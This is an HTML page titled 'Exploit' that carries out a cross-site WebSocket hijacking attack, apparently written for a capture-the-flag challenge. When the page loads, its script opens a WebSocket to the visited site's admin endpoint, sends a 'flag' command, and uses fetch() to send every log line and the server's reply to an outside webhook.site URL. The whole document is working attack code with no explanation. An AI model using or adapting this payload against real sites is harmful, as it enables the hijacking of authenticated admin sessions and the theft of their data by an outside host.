<!DOCTYPE html>
<html>
<head>
    <title>Exploit</title>
</head>
<body>
    <h1>Exploiting WebSocket CSRF</h1>
    <div id="output"></div>

    <script>
        // Function to log output
        function log(message) {
            document.getElementById('output').innerHTML += message + '<br>';
            // Also send to our server for logging
            fetch('https://webhook.site/62178ee3-4f09-4a95-9e9f-fa6f0a85468d/log?data=' + encodeURIComponent(message));
        }

        // Try to establish admin WebSocket connection
        const adminWs = new WebSocket(`ws://${window.location.hostname}:${window.location.port}/admin/ws`);
        
        adminWs.onopen = function() {
            log('Admin WebSocket connection established!');
            // Request the flag
            adminWs.send('flag');
            log('Sent flag command');
        };

        adminWs.onmessage = function(event) {
            log('Received: ' + event.data);
            // Exfiltrate the flag
            fetch('https://webhook.site/62178ee3-4f09-4a95-9e9f-fa6f0a85468d/flag?data=' + encodeURIComponent(event.data));
        };

        adminWs.onerror = function(error) {
            log('WebSocket Error: ' + JSON.stringify(error));
        };

        adminWs.onclose = function() {
            log('Admin WebSocket connection closed');
        };
    </script>
</body>
</html>
